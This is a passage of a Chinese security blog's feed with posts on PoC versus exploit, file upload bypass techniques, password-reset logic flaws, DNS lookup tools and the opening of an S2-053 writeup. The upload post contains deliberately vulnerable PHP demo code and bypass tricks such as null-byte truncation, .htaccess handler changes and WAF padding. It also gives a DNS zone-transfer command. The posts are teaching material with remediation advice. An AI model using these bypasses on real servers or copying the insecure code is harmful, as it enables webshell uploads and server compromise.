rel="external">https://github.com/WooYun/TangScan</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;什么是-PoC&quot;&gt;&lt;a href=&quot;#什么是-PoC&quot; class=&quot;headerlink&quot; title=&quot;什么是 PoC&quot;&gt;&lt;/a&gt;什么是 PoC&lt;/h2&gt;&lt;p&gt;PoC(全称: Proof of Concept), 中文译作概念验证。在安全界，你可以理解成为漏洞验证程序,和一些应用程序相比，PoC 是一段不完整的程序，仅仅是为了证明提出者的观点的一段代码&lt;/p&gt;
&lt;h2 id=&quot;什么是-Exp&quot;&gt;&lt;a href=&quot;#什么是-Exp&quot; class=&quot;headerlink&quot; title=&quot;什么是 Exp&quot;&gt;&lt;/a&gt;什么是 Exp&lt;/h2&gt;&lt;p&gt;Exp(全称: Exploit),中文叫漏洞利用程序。名字上说的已经很清楚了，简单讲，就是一段可以发挥漏洞价值的程序，这话感觉和没说一样。想象一下这样的场景，目标存在一个 SQL 注入漏洞，然后被你知道了，然后你编写了一个程序，通过这个 SQL 注入漏洞，拿到了目标的权限，那么这个程序就是所谓的 Exp 了.&lt;/p&gt;
&lt;h2 id=&quot;POC与EXP的区别&quot;&gt;&lt;a href=&quot;#POC与EXP的区别&quot; class=&quot;headerlink&quot; title=&quot;POC与EXP的区别&quot;&gt;&lt;/a&gt;POC与EXP的区别&lt;/h2&gt;
    
    </summary>
    
      <category term="安全编程" scheme="http://y-hkl.top/categories/%E5%AE%89%E5%85%A8%E7%BC%96%E7%A8%8B/"/>
    
    
      <category term="POC" scheme="http://y-hkl.top/tags/POC/"/>
    
      <category term="编程" scheme="http://y-hkl.top/tags/%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>文件上传漏洞解析及绕过姿势</title>
    <link href="http://y-hkl.top/2017/09/16/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90%E5%8F%8A%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/"/>
    <id>http://y-hkl.top/2017/09/16/文件上传漏洞解析及绕过姿势/</id>
    <published>2017-09-17T02:21:01.000Z</published>
    <updated>2017-09-17T03:09:35.988Z</updated>
    
    <content type="html"><![CDATA[<p>文件上传漏洞在渗透测试中是一个非常重要的漏洞，因为这个漏洞可以很快的拿到服务器的权限，下面介绍一下文件上传漏洞的效验方法，绕过方式，和一些修复建议。<br><a id="more"></a></p>
<h2 id="文件上传校验姿势"><a href="#文件上传校验姿势" class="headerlink" title="文件上传校验姿势"></a>文件上传校验姿势</h2><ul>
<li>客户端javascript校验（一般只校验后缀名）</li>
<li>服务端校验<ul>
<li>文件头content-type字段校验（image/gif）</li>
<li>文件内容头校验（GIF89a）</li>
<li>后缀名黑名单校验</li>
<li>后缀名白名单校验</li>
<li>自定义正则校验</li>
</ul>
</li>
<li>WAF设备校验（根据不同的WAF产品而定）<h2 id="客户端JS验证"><a href="#客户端JS验证" class="headerlink" title="客户端JS验证"></a>客户端JS验证</h2><h3 id="验证代码"><a href="#验证代码" class="headerlink" title="验证代码"></a>验证代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">//文件上传漏洞演示脚本之js验证</span></div><div class="line">$uploaddir = <span class="string">'uploads/'</span>;</div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</div><div class="line">    <span class="keyword">if</span> (file_exists($uploaddir)) &#123;</div><div class="line">        <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'upfile'</span>][<span class="string">'tmp_name'</span>], $uploaddir . <span class="string">'/'</span> . $_FILES[<span class="string">'upfile'</span>][<span class="string">'name'</span>])) &#123;</div><div class="line">            <span class="keyword">echo</span> <span class="string">'文件上传成功，保存于：'</span> . $uploaddir . $_FILES[<span class="string">'upfile'</span>][<span class="string">'name'</span>] . <span class="string">"\n"</span>;</div><div class="line">        &#125;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        <span class="keyword">exit</span>($uploaddir . <span class="string">'文件夹不存在,请手工创建！'</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="comment">//print_r($_FILES);</span></div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div><div class="line">&lt;!DOCTYPE html <span class="keyword">PUBLIC</span> <span class="string">"-//W3C//DTD XHTML 1.0 Transitional//EN"</span></div><div class="line">    <span class="string">"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"</span>&gt;</div><div class="line">&lt;html xmlns=<span class="string">"http://www.w3.org/1999/xhtml"</span>&gt;</div><div class="line">&lt;head&gt;</div><div class="line">    &lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html;charset=gbk"</span>/&gt;</div><div class="line">    &lt;meta http-equiv=<span class="string">"content-language"</span> content=<span class="string">"zh-CN"</span>/&gt;</div><div class="line">    &lt;title&gt;文件上传漏洞演示脚本--JS验证实例&lt;/title&gt;</div><div class="line">    &lt;script type=<span class="string">"text/javascript"</span>&gt;</div><div class="line">       <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span><span class="params">()</span> </span>&#123;</div><div class="line">            <span class="keyword">var</span> file = document.getElementsByName(<span class="string">'upfile'</span>)[<span class="number">0</span>].value;</div><div class="line">            <span class="keyword">if</span> (file == <span class="keyword">null</span> || file == <span class="string">""</span>) &#123;</div><div class="line">                alert(<span class="string">"你还没有选择任何文件，不能上传!"</span>);</div><div class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">            &#125;</div><div class="line">            <span class="comment">//定义允许上传的文件类型</span></div><div class="line">            <span class="keyword">var</span> allow_ext = <span class="string">".jpg|.jpeg|.png|.gif|.bmp|"</span>;</div><div class="line">            <span class="comment">//提取上传文件的类型</span></div><div class="line">            <span class="keyword">var</span> ext_name = file.substring(file.lastIndexOf(<span class="string">"."</span>));</div><div class="line">            <span class="comment">//alert(ext_name);</span></div><div class="line">            <span class="comment">//alert(ext_name + "|");</span></div><div class="line">            <span class="comment">//判断上传文件类型是否允许上传</span></div><div class="line">            <span class="keyword">if</span> (allow_ext.indexOf(ext_name + <span class="string">"|"</span>) == <span class="number">-1</span>) &#123;</div><div class="line">                <span class="keyword">var</span> errMsg = <span class="string">"该文件不允许上传，请上传"</span> + allow_ext + <span class="string">"类型的文件,当前文件类型为："</span> +     ext_name;</div><div class="line">                alert(errMsg);</div><div class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &lt;/script&gt;</div><div class="line">&lt;body&gt;</div><div class="line">&lt;h3&gt;文件上传漏洞演示脚本--JS验证实例&lt;/h3&gt;</div><div class="line">&lt;form action=<span class="string">""</span> method=<span class="string">"post"</span> enctype=<span class="string">"multipart/form-data"</span> name=<span class="string">"upload"</span> onsubmit=<span class="string">"return     checkFile()"</span>&gt;</div><div class="line">    &lt;input type=<span class="string">"hidden"</span> name=<span class="string">"MAX_FILE_SIZE"</span> value=<span class="string">"204800"</span>/&gt;</div><div class="line">    请选择要上传的文件：&lt;input type=<span class="string">"file"</span> name=<span class="string">"upfile"</span>/&gt;</div><div class="line">    &lt;input type=<span class="string">"submit"</span> name=<span class="string">"submit"</span> value=<span class="string">"上传"</span>/&gt;</div><div class="line">&lt;/form&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure>
</li>
</ul>
<p>客户端JS验证通常做法是验证上传文件的扩展名是否符合验证条件</p>
<h3 id="绕过姿势"><a href="#绕过姿势" class="headerlink" title="绕过姿势"></a>绕过姿势</h3><p>1.通过firefox的F12修改js代码绕过验证<br>2.使用burp抓包直接提交，绕过js验证</p>
<h2 id="文件头content-type字段校验（image-gif）"><a href="#文件头content-type字段校验（image-gif）" class="headerlink" title="文件头content-type字段校验（image/gif）"></a>文件头content-type字段校验（image/gif）</h2><h3 id="验证测试代码"><a href="#验证测试代码" class="headerlink" title="验证测试代码"></a>验证测试代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">if</span>($_FILE[<span class="string">'userfile'</span>][<span class="string">'type'</span>] != <span class="string">"image/gif"</span>)&#123; <span class="comment">//检测content-type</span></div><div class="line">    <span class="keyword">echo</span> <span class="string">"sorry,we only allow uploading GIF images"</span>;</div><div class="line">    <span class="keyword">exit</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"Upload success!"</span>;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>以上是一个简单的服务器上传验证代码，只要content-type符合image/gif就允许上传</p>
<h3 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h3><p>使用Burp截取上传数据包，修改Content-Type的值，改为image/gif即可成功绕过上传webshell</p>
<h2 id="服务端文件扩展名检测"><a href="#服务端文件扩展名检测" class="headerlink" title="服务端文件扩展名检测"></a>服务端文件扩展名检测</h2><h3 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$type = <span class="keyword">array</span>(<span class="string">"php"</span>,<span class="string">"php3"</span>);</div><div class="line"><span class="comment">//判断上传文件类型</span></div><div class="line">$fileext = fileext($_FILE[<span class="string">'file'</span>][<span class="string">'name'</span>]);</div><div class="line"><span class="keyword">if</span>(!in_array($fileext,$type))&#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"upload success!"</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span>&#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"sorry"</span>;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>默认上传后的文件保存的名字是以获取到名字</p>
<h3 id="绕过技巧"><a href="#绕过技巧" class="headerlink" title="绕过技巧"></a>绕过技巧</h3><ol>
<li>使用大小写绕过（针对对大小写不敏感的系统如windows），如：PhP</li>
<li>使用黑名单外的脚本类型，如：php5,asa 和 cer等<br>能被解析的文件扩展名列表：<br>jsp jspx jspf<br>asp asa cer aspx</li>
<li>配合文件包含漏洞<br>前提：校验规则只校验当文件后缀名为asp/php/jsp的文件内容是否为木马。<br>绕过方式：（这里拿php为例，此漏洞主要存在于PHP中）<br>（1）先上传一个内容为木马的txt后缀文件，因为后缀名的关系没有检验内容；<br>（2）然后再上传一个.php的文件，内容为<br>此时，这个php文件就会去引用txt文件的内容，从而绕过校验</li>
<li>配合服务器解析漏洞<br>如：test.jpg.xxx(apache解析漏洞)</li>
<li>配合操作系统文件命令规则<br>（1）上传不符合windows文件命名规则的文件名<br>　　test.asp.<br>　　test.asp(空格)<br>　　test.php:1.jpg<br>　　test.php:: $DATA<br>会被windows系统自动去掉不符合规则符号后面的内容。<br>（2）linux下后缀名大小写<br>在linux下，如果上传php不被解析，可以试试上传pHp后缀的文件名。</li>
<li>双扩展名之间使用00截断，绕过验证上传恶意代码<br>0x00截断：基于一个组合逻辑漏洞造成的，通常存在于构造上传文件路径的时候<br>　　test.php(0x00).jpg<br>　　test.php%00.jpg<br>　　路径/upload/1.php(0x00)，文件名1.jpg，结合/upload/1.php(0x00)/1.jpg</li>
<li>借助.htaccess文件上传恶意代码并解析。如：上传一个.htaccess文件，内容为AddTypeapplication/x-httpd-php .jpg，上传的jpg文件就可以当作php来解析</li>
<li>超长文件名截断上传(windows 258byte | linux 4096byte)</li>
<li>CMS、编辑器漏洞<br>（1）CMS漏洞：比如说JCMS等存在的漏洞，可以针对不同CMS存在的上传漏洞进行绕过。<br>（2）编辑器漏洞：比如FCK，ewebeditor等，可以针对编辑器的漏洞进行绕过<h2 id="服务端检测文件头"><a href="#服务端检测文件头" class="headerlink" title="服务端检测文件头"></a>服务端检测文件头</h2><h3 id="文件头简介"><a href="#文件头简介" class="headerlink" title="文件头简介"></a>文件头简介</h3>不同的图片文件都有不同文件头，如：<br>PNG： 文件头标识 (8 bytes) 89 50 4E 47 0D 0A 1A 0A<br>JPEG： 文件头标识 (2 bytes): 0xff, 0xd8 (SOI) (JPEG 文件标识)<br>GIF： 文件头标识 (6 bytes) 47 49 46 38 39(37) 61<h3 id="绕过方式-1"><a href="#绕过方式-1" class="headerlink" title="绕过方式"></a>绕过方式</h3>绕过这个检测只需要在恶意脚本前加上允许上传文件的头标识就可以了<br>在木马内容基础上再加了一些文件信息，有点像下面的结构<br>GIF89a<h2 id="服务器段安装WAF"><a href="#服务器段安装WAF" class="headerlink" title="服务器段安装WAF"></a>服务器段安装WAF</h2>服务器段安装安全狗等安全防御软件<h3 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h3></li>
<li>垃圾数据<br>有些主机WAF软件为了不影响web服务器的性能，会对校验的用户数据设置大小上限，比如1M。此种情况可以构造一个大文件，前面1M的内容为垃圾内容，后面才是真正的木马内容，便可以绕过WAF对文件内容的校验；</li>
<li>filename<br>针对早期版本安全狗，可以多加一个filename</li>
<li>POST/GET<br>有些WAF的规则是：如果数据包为POST类型，则校验数据包内容。<br>此种情况可以上传一个POST型的数据包，抓包将POST改为GET<h2 id="安全建议"><a href="#安全建议" class="headerlink" title="安全建议"></a>安全建议</h2></li>
<li>使用白名单限制可以上传的文件扩展</li>
<li>验证文件内容，使用正则匹配恶意代码限制上传</li>
<li>对上传后的文件统一随机命名，不允许用户控制扩展名</li>
<li>修复服务器可能存在的解析漏洞</li>
<li>严格限制可以修改服务器配置的文件上传如：.htaccess</li>
<li>隐藏上传文件路径。</li>
</ol>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;文件上传漏洞在渗透测试中是一个非常重要的漏洞，因为这个漏洞可以很快的拿到服务器的权限，下面介绍一下文件上传漏洞的效验方法，绕过方式，和一些修复建议。&lt;br&gt;
    
    </summary>
    
      <category term="web安全" scheme="http://y-hkl.top/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="文件上传漏洞" scheme="http://y-hkl.top/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>逻辑漏洞之密码重置</title>
    <link href="http://y-hkl.top/2017/09/16/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E4%B9%8B%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE/"/>
    <id>http://y-hkl.top/2017/09/16/逻辑漏洞之密码重置/</id>
    <published>2017-09-16T15:15:15.000Z</published>
    <updated>2017-09-16T15:21:15.857Z</updated>
    
    <content type="html"><![CDATA[<p>逻辑错误漏洞是指由于程序逻辑不严或逻辑太复杂，导致一些逻辑分支不能够正常处理或处理错误，一般出现在任意密码修改（没有旧密码验证）、越权访问、密码找回、交易支付金额。下面介绍一下密码重置漏洞。<br><a id="more"></a></p>
<h2 id="密码找回验证条件可社工"><a href="#密码找回验证条件可社工" class="headerlink" title="密码找回验证条件可社工"></a>密码找回验证条件可社工</h2><p>1 只验证帐号是否存在即可修改密码<br>2 只验证帐号与邮箱地址是否匹配即可修改密码<br>3 只验证帐号与手机号是否匹配即可修改密码</p>
<h2 id="密码修改页面可预测"><a href="#密码修改页面可预测" class="headerlink" title="密码修改页面可预测"></a>密码修改页面可预测</h2><p>案例：<a href="http://wooyun.jozxing.cc/static/bugs/wooyun-2012-04190.html" target="_blank" rel="external">http://wooyun.jozxing.cc/static/bugs/wooyun-2012-04190.html</a></p>
<h2 id="验证码可爆破"><a href="#验证码可爆破" class="headerlink" title="验证码可爆破"></a>验证码可爆破</h2><p>案例：<a href="http://wooyun.jozxing.cc/static/bugs/wooyun-2012-07386.html" target="_blank" rel="external">http://wooyun.jozxing.cc/static/bugs/wooyun-2012-07386.html</a></p>
<h2 id="修改密码未校验用户"><a href="#修改密码未校验用户" class="headerlink" title="修改密码未校验用户"></a>修改密码未校验用户</h2><p>案例：<a href="http://wooyun.jozxing.cc/static/bugs/wooyun-2012-07888.html" target="_blank" rel="external">http://wooyun.jozxing.cc/static/bugs/wooyun-2012-07888.html</a></p>
<h2 id="密码重置验证码接收帐号由客户端决定"><a href="#密码重置验证码接收帐号由客户端决定" class="headerlink" title="密码重置验证码接收帐号由客户端决定"></a>密码重置验证码接收帐号由客户端决定</h2><p>案例：<a href="http://wooyun.jozxing.cc/static/bugs/wooyun-2015-0153395.html" target="_blank" rel="external">http://wooyun.jozxing.cc/static/bugs/wooyun-2015-0153395.html</a></p>
<h2 id="修改返回包绕过验证码找回密码"><a href="#修改返回包绕过验证码找回密码" class="headerlink" title="修改返回包绕过验证码找回密码"></a>修改返回包绕过验证码找回密码</h2><p>案例：<a href="http://wooyun.jozxing.cc/static/bugs/wooyun-2015-0128703.html" target="_blank" rel="external">http://wooyun.jozxing.cc/static/bugs/wooyun-2015-0128703.html</a></p>
<h2 id="重置密码新密码出现在返回的数据包中"><a href="#重置密码新密码出现在返回的数据包中" class="headerlink" title="重置密码新密码出现在返回的数据包中"></a>重置密码新密码出现在返回的数据包中</h2><p>案例：<a href="http://wooyun.jozxing.cc/static/bugs/wooyun-2015-0131428.html" target="_blank" rel="external">http://wooyun.jozxing.cc/static/bugs/wooyun-2015-0131428.html</a></p>
<h2 id="密码重置验证码出现在返回数据包中"><a href="#密码重置验证码出现在返回数据包中" class="headerlink" title="密码重置验证码出现在返回数据包中"></a>密码重置验证码出现在返回数据包中</h2><p>案例：<a href="http://wooyun.jozxing.cc/static/bugs/wooyun-2015-0133855.html" target="_blank" rel="external">http://wooyun.jozxing.cc/static/bugs/wooyun-2015-0133855.html</a></p>
<h2 id="密码重置验证码多人公用"><a href="#密码重置验证码多人公用" class="headerlink" title="密码重置验证码多人公用"></a>密码重置验证码多人公用</h2><p>案例：<a href="http://wooyun.jozxing.cc/static/bugs/wooyun-2015-091414.html" target="_blank" rel="external">http://wooyun.jozxing.cc/static/bugs/wooyun-2015-091414.html</a></p>
<h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h2><p>1 减少验证码有效时间<br>2 使用后即销毁<br>3 增加验证码复杂程序，整个md5 不困难吧，<br>4 限制该功能单个ip提交频率<br>5 对重要参数加入验证码同步信息或时间戳；<br>6 重置密码后，新密码不应返回在数据包中。<br>7 接收验证码的帐号由服务端提供，不能信任客户端提交的数据</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;逻辑错误漏洞是指由于程序逻辑不严或逻辑太复杂，导致一些逻辑分支不能够正常处理或处理错误，一般出现在任意密码修改（没有旧密码验证）、越权访问、密码找回、交易支付金额。下面介绍一下密码重置漏洞。&lt;br&gt;
    
    </summary>
    
      <category term="web安全" scheme="http://y-hkl.top/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="逻辑漏洞" scheme="http://y-hkl.top/tags/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="密码重置" scheme="http://y-hkl.top/tags/%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE/"/>
    
  </entry>
  
  <entry>
    <title>DNS信息查询</title>
    <link href="http://y-hkl.top/2017/09/14/DNS%E4%BF%A1%E6%81%AF%E6%9F%A5%E8%AF%A2/"/>
    <id>http://y-hkl.top/2017/09/14/DNS信息查询/</id>
    <published>2017-09-14T06:18:23.000Z</published>
    <updated>2017-09-14T07:03:38.193Z</updated>
    
    <content type="html"><![CDATA[<p>DNS查询在渗透或者运维工作经常遇到，尤其是内部有DNS服务器的公司，需要定时监测DNS解析的是否正常，有无被DNS劫持的情况。下面介绍几个常见的DNS查询工具。<br><a id="more"></a></p>
<h2 id="nslookup"><a href="#nslookup" class="headerlink" title="nslookup"></a>nslookup</h2><p>nslookup可以指定查询的类型，可以查到DNS记录的生存时间还可以指定使用哪个DNS服务器进行解释</p>
<h3 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h3><h4 id="非交互式"><a href="#非交互式" class="headerlink" title="非交互式"></a>非交互式</h4><p>查询y-hkl.top域名对应的ip，这里指定了前往114.114.114.114－dns服务器进行查询。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">root@HKL:~# nslookup y-hkl.top 114.114.114.114</div><div class="line">Server:		114.114.114.114</div><div class="line">Address:	114.114.114.114#53</div><div class="line">Non-authoritative answer:</div><div class="line">Name:	y-hkl.top</div><div class="line">Address:</div></pre></td></tr></table></figure></p>
<p>查询y-hkl.top域名DNS服务商<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">root@HKL:~# nslookup -type=ns y-hkl.top</div><div class="line">Server:		114.114.114.114</div><div class="line">Address:	114.114.114.114#53</div><div class="line">Non-authoritative answer:</div><div class="line">y-hkl.top	nameserver = </div><div class="line">y-hkl.top	nameserver = </div><div class="line">Authoritative answers can be found from:</div></pre></td></tr></table></figure></p>
<p>查询y-hkl.top的邮件服务器<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">root@HKL:~# nslookup -type=mx y-hkl.top</div><div class="line">Server:		114.114.114.114</div><div class="line">Address:	114.114.114.114#53</div><div class="line">Non-authoritative answer:</div><div class="line">y-hkl.top	mail exchanger = </div><div class="line">y-hkl.top	mail exchanger = </div><div class="line">Authoritative answers can be found from:</div></pre></td></tr></table></figure></p>
<h4 id="交互式"><a href="#交互式" class="headerlink" title="交互式"></a>交互式</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">nslookup</div><div class="line">&gt;set type=a              #设置更改要查询的dns解析类型</div><div class="line">&gt;y-hkl.top               #输入要查询的域名</div><div class="line">&gt;set type=mx             #设置更改要查询的dns解析类型</div><div class="line">&gt;y-hkl.top</div><div class="line">&gt;server 114.114.114.114  #设置更改要查询的dns服务器地址</div><div class="line">&gt;ls y-hkl.top #ls命令列出某个域中的所有域名</div></pre></td></tr></table></figure>
<p>常见DNS记录类型<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">A       IP地址记录,记录一个域名对应的IP地址</div><div class="line">AAAA    IPv6 地址记录，记录一个域名对应的IPv6地址</div><div class="line">CNAME   别名记录，记录一个主机的别名 </div><div class="line">MX      电子邮件交换记录，记录一个邮件域名对应的IP地址，如root@xxxx.com</div><div class="line">NS      域名服务器记录 ,记录该域名由哪台域名服务器解析</div><div class="line">PTR     反向记录，也即从IP地址到域名的一条记录</div><div class="line">TXT     记录域名的相关文本信息</div></pre></td></tr></table></figure></p>
<h2 id="host"><a href="#host" class="headerlink" title="host"></a>host</h2><h3 id="用法-1"><a href="#用法-1" class="headerlink" title="用法"></a>用法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">host -t A thief.one</div></pre></td></tr></table></figure>
<h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">-a：显示详细的DNS信息；</div><div class="line">-c&lt;类型&gt;：指定查询类型，默认值为“IN“；</div><div class="line">-C：查询指定主机的完整的SOA记录；</div><div class="line">-r：在查询域名时，不使用递归的查询方式；</div><div class="line">-t&lt;类型&gt;：指定查询的域名信息类型；</div><div class="line">-v：显示指令执行的详细信息；</div><div class="line">-w：如果域名服务器没有给出应答信息，则总是等待，直到域名服务器给出应答；</div><div class="line">-W&lt;时间&gt;：指定域名查询的最长时间，如果在指定时间内域名服务器没有给出应答信息，则退出指令；</div><div class="line">-4：使用IPv4； host</div><div class="line">-6：使用IPv6.</div></pre></td></tr></table></figure>
<h2 id="dig"><a href="#dig" class="headerlink" title="dig"></a>dig</h2><h3 id="用法-2"><a href="#用法-2" class="headerlink" title="用法"></a>用法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">dig thief.one mx</div><div class="line">dig thief.one ns</div><div class="line">dig @202.106.0.20 thief.one a  指定dns服务器</div><div class="line">dig thief.one a +tcp  设置为tcp协议，默认为udp</div><div class="line">dig thief.one a +trace 这个参数之后将显示从根域逐级查询的过程</div></pre></td></tr></table></figure>
<p>若<a href="http://y-hkl.top">http://y-hkl.top</a> 的DNS服务器为10.0.0.1，且存在域传送漏洞，则使用dig @10.0.0.1 <a href="http://y-hkl" target="_blank" rel="external">http://y-hkl</a> axfr即可查看所有域名了。</p>
<h3 id="参数-1"><a href="#参数-1" class="headerlink" title="参数"></a>参数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">@&lt;服务器地址&gt;：指定进行域名解析的域名服务器；</div><div class="line">-b：当主机具有多个IP地址，指定使用本机的哪个IP地址向域名服务器发送域名查询请求；</div><div class="line">-f&lt;文件名称&gt;：指定dig以批处理的方式运行，指定的文件中保存着需要批处理查询的DNS任务信息；</div><div class="line">-P：指定域名服务器所使用端口号；</div><div class="line">-t&lt;类型&gt;：指定要查询的DNS数据类型；</div><div class="line">-x：执行逆向域名查询；</div><div class="line">-4：使用IPv4；</div><div class="line">-6：使用IPv6；</div><div class="line">-h：显示指令帮助信息。</div></pre></td></tr></table></figure>
<h2 id="whois"><a href="#whois" class="headerlink" title="whois"></a>whois</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">whois thief.one</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;DNS查询在渗透或者运维工作经常遇到，尤其是内部有DNS服务器的公司，需要定时监测DNS解析的是否正常，有无被DNS劫持的情况。下面介绍几个常见的DNS查询工具。&lt;br&gt;
    
    </summary>
    
      <category term="web安全" scheme="http://y-hkl.top/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="DNS" scheme="http://y-hkl.top/tags/DNS/"/>
    
  </entry>
  
  <entry>
    <title>s2-053漏洞复现</title>
    <link href="http://y-hkl.top/2017/09/13/s2-053%E5%A4%8D%E7%8E%B0/"/>
    <id>http://y-hkl.top/2017/09/13/s2-053复现/</id>
    <published>2017-09-13T06:54:49.000Z</published>
    <updated>2017-09-13T07:41:07.389Z</updated>
    
    <content type="html"><![CDATA[<p>2017年9月7日，Struts官方发布一个中危的安全漏洞，该漏洞编号为:S2-053,在一定条件下，当开发人员在Freemarker标签中使用错误的构造时，可能会导致远程代码执行漏洞<br><a id="more"></a></p>
<h2 id="漏洞编号"><a href="#漏洞编号" class="headerlink" title="漏洞编号"></a>漏洞编号</h2><p>CVE-2017-12611</p>
<h2 id="漏洞名称"><a href="#漏洞名称" class="headerlink" title="漏洞名称"></a>漏洞名称</h2><p>Freemarker标签远程代码执行漏洞</p>
<h2 id="漏洞评级"><a href="#漏洞评级" class="headerlink" title="漏洞评级"></a>漏洞评级</h2><p>中危</p>
<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>Struts 2.0.1 - 2.3.33<br>Struts 2.5 - 2.5.10</p>
